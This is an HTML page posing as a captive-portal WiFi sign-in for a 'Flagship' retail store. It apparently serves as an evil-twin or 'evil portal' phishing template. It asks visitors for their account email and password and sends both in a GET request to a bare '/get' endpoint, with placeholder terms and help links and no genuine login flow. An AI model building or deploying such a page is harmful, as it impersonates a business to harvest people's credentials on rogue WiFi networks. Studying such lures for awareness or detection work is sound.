<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Flagship Store — WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#f8f8f8;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:400px;background:#fff;border-radius:0;overflow:hidden;box-shadow:0 2px 30px rgba(0,0,0,0.08)}
.top{background:#1a1a1a;padding:28px 28px 22px;text-align:center}
.store-name{font-size:28px;font-weight:900;color:#fff;letter-spacing:3px;text-transform:uppercase}
.store-sub{font-size:9px;color:#555;letter-spacing:3px;text-transform:uppercase;margin-top:6px}
.ssid-row{background:#111;border-top:1px solid #222;padding:7px 28px;display:flex;align-items:center;gap:8px}
.dot{width:6px;height:6px;background:#4ade80;border-radius:50%}
.ssid-row span{font-size:11px;color:#444}
.ssid-row strong{color:#888;font-weight:500}
.body{padding:26px 28px 22px}
h2{font-size:17px;font-weight:700;color:#1a1a1a;margin-bottom:3px}
.sub{font-size:12.5px;color:#aaa;margin-bottom:18px}
.lbl{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:#aaa;margin-bottom:7px;margin-top:18px}
input{width:100%;padding:12px 14px;border:1.5px solid #e8e8e8;border-radius:0;font-size:14.5px;background:#fafafa;color:#1a1a1a}
input:focus{outline:none;border-color:#1a1a1a;box-shadow:none}
input::placeholder{color:#ddd}
.btn{width:100%;padding:13px;margin-top:22px;border:none;background:#1a1a1a;color:#fff;font-size:12px;font-weight:700;letter-spacing:2.5px;text-transform:uppercase;cursor:pointer}
.btn:hover{background:#333}
.terms{font-size:11px;color:#ccc;text-align:center;margin-top:14px;line-height:1.6}
.terms a{color:#1a1a1a}
.foot{background:#fafafa;border-top:1.5px solid #1a1a1a;padding:12px 28px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:10px;color:#ccc;text-decoration:none;letter-spacing:0.5px}
.foot a{color:#1a1a1a}
</style>
</head>
<body>
<div class="card">
  <div class="top">
    <div class="store-name">Flagship</div>
    <div class="store-sub">Premium Retail Store</div>
  </div>
  <div class="ssid-row"><div class="dot"></div><span>Network: <strong>Flagship-Store-WiFi</strong></span></div>
  <div class="body">
    <h2>Member Access</h2>
    <p class="sub">Sign in with your account to connect to our in-store network.</p>
    <form action="/get">
      <label class="lbl">Account Email</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <button type="submit" class="btn">Connect</button>
      <p class="terms">By connecting you agree to our <a href="#">Terms of Use</a>.</p>
    </form>
  </div>
  <div class="foot"><span>&copy; Flagship Retail</span><a href="#">Help</a></div>
</div>
</body>
</html>
